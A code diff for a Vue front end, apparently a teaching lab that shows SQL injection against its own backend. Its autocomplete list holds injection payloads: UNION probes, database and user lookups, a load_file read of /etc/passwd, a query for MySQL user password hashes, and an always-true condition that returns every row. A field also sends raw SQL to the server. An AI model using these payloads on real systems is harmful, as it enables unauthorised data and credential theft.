@@ -1,28 +1,46 @@
 <template>
-  <div>
+  <div style="height: 900px;">
     <div style="height: 30px;">
       <Progress :percent="progress" :stroke-color="['#108ee9', '#87d068']" :stroke-width="20" status="active" hide-info/>
     </div>
     <h2>前端</h2>
-    <Form ref="messageInfo" :model="messageInfo" label-position="left" :label-width="100">
+    <Form ref="userId" :model="messageInfo" label-position="left" :label-width="200">
       <FormItem label="User ID:">
           <AutoComplete
-            v-model="messageInfo.sql"
+            v-model="idWithSqlInjection"
             icon="ios-search"
             placeholder="input here"
             style="width:300px">
-            <div class="demo-auto-complete-item" v-for="item in data4" :key="item">
+            <div class="demo-auto-complete-item" v-for="item in sqlInjection" :key="item">
               <div class="demo-auto-complete-group">
                 <span>{{ item.title }}</span>
-                <a href="https://www.google.com/search?q=iView" target="_blank">更多</a>
               </div>
               <Option v-for="option in item.children" :value="option.title" :key="option.title">
                 <span class="demo-auto-complete-title">{{ option.title }}</span>
-                <span class="demo-auto-complete-count">{{ option.count }} 人关注</span>
+                <span v-if="option.count != undefined" class="demo-auto-complete-count"> Memo: {{ option.count }}</span>
               </Option>
             </div>
-            <a href="https://www.google.com/search?q=iView" target="_blank" class="demo-auto-complete-more">查看所有结果</a>
           </AutoComplete>
+      </FormItem>
+      <FormItem>
+        <i-button type="success" @click = "handleQuery">Submit</i-button>
+        <i-button type="error" @click = "handleReset('userId')">RESET</i-button>
+      </FormItem>
+      <FormItem label="SQL to execute:">
+        <AutoComplete
+          v-model="messageInfo.sql"
+          icon="ios-search"
+          placeholder="input here"
+          style="width:300px">
+          <div class="demo-auto-complete-item" v-for="item in sqlExecute" :key="item">
+            <div class="demo-auto-complete-group">
+              <span>{{ item.title }}</span>
+            </div>
+            <Option v-for="option in item.children" :value="option.title" :key="option.title">
+              <span class="demo-auto-complete-title">{{ option.title }}</span>
+            </Option>
+          </div>
+        </AutoComplete>
       </FormItem>
       <FormItem>
         <i-button type="success" @click = "handleSubmit(messageInfo)">Submit</i-button>
@@ -39,9 +57,6 @@
         <Spin size="large" v-if="loading"></Spin>
         <Input v-else v-model="feedbackMessage" type="textarea" :autosize="{minRows: 2,maxRows: 8}" placeholder="Haven't submit..." style="width: 500px" />
       </FormItem>
-      <FormItem label="花费时间" v-if = "feedbackMessage !== ''">
-        <Tag color="error" >{{backendTime}}ms</Tag>
-      </FormItem>
     </Form>
   </div>
 </template>
@@ -54,47 +69,115 @@ export default {
         sql: '',
         category: ''
       },
+      idWithSqlInjection: '',
       value4: '',
-      data4: [
+      sqlInjection: [
         {
-          title: '话题',
+          title: '正常查询',
           children: [
             {
-              title: 'iView',
-              count: 10000
+              title: '1'
             },
             {
-              title: 'iView UI',
-              count: 10600
+              title: '2'
             }
           ]
         },
         {
-          title: '问题',
+          title: '注入判断',
           children: [
             {
-              title: 'iView UI 有多好',
-              count: 60100
+              title: '1',
+              count: '正常结果'
             },
             {
-              title: 'iView 是啥',
-              count: 30010
+              title: '1 and 1=1',
+              count: '若存在注入点，则与第一条结果一致'
+            },
+            {
+              title: '1 and 1= 2',
+              count: '且该条结果与第一条结果不同'
             }
           ]
         },
         {
-          title: '文章',
+          title: '构造union',
           children: [
             {
-              title: 'iView 是一个设计语言',
-              count: 100000
+              title: '1 union select 1'
+            },
+            {
+              title: '1 union select 1, 2'
+            },
+            {
+              title: '1 union select 1, 2, 3'
+            },
+            {
+              title: '1 union select * from user'
+            }
+          ]
+        },
+        {
+          title: '查询数据库信息',
+          children: [
+            {
+              title: '1 union select version()',
+              count: '调用mysql函数，返回版本'
+            },
+            {
+              title: '1 union select database()',
+              count: '调用mysql函数，返回数据库名字'
+            }
+          ]
+        },
+        {
+          title: '查询数据库用户',
+          children: [
+            {
+              title: '1 union select user()'
+            },
+            {
+              title: '1 union select session_user()'
+            },
+            {
+              title: '1 union select system_user()'
+            }
+          ]
+        },
+        {
+          title: '读取系统信息',
+          children: [
+            {
+              title: '1 union select load_file(\'/etc/passwd/\')',
+              count: '读取文件，返回系统密码'
+            },
+            {
+              title: '1 select user.password from mysql.user',
+              count: '返回数据库用户的密码'
+            }
+          ]
+        },
+        {
+          title: '返回所有数据',
+          children: [
+            {
+              title: '1 or 2=2'
+            }
+          ]
+        }
+      ],
+      sqlExecute: [
+        {
+          title: '显示数据库中的table',
+          children: [
+            {
+              title: 'show databases;'
             }
           ]
         }
       ],
       status: '',
       feedbackMessage: '',
-      backendTime: '',
       result: '',
       progress: 0,
       loading: false
@@ -110,11 +193,10 @@ export default {
         if (r.success === true) {
           this.feedbackMessage = r.data
           this.status = r.success
-          this.backendTime = 1 // r.backendTime
           console.log(this.feedbackMessage)
           this.$Message.success('Success!')
         } else {
-          this.$Message.error('Error!')
+          this.$Message.error('Fail! ' + r.errorMsg)
         }
       })
     },
@@ -127,6 +209,20 @@ export default {
       this.messageInfo = []
       this.status = ''
       this.feedbackMessage = ''
+      this.idWithSqlInjection = ''
+    },
+    handleQuery () { // 带''是字符串, 不带传入Object
+      this.$api.get('/seminar3/exp1', { id: this.idWithSqlInjection }, r => {
+        r = r.data
+        if (r.success === true) {
+          this.feedbackMessage = JSON.stringify(r.data)
+          this.status = r.success
+          console.log(this.feedbackMessage)
+          this.$Message.success('Success!')
+        } else {
+          this.$Message.error('Fail! ' + r.errorMsg)
+        }
+      })
     }
   }
 }
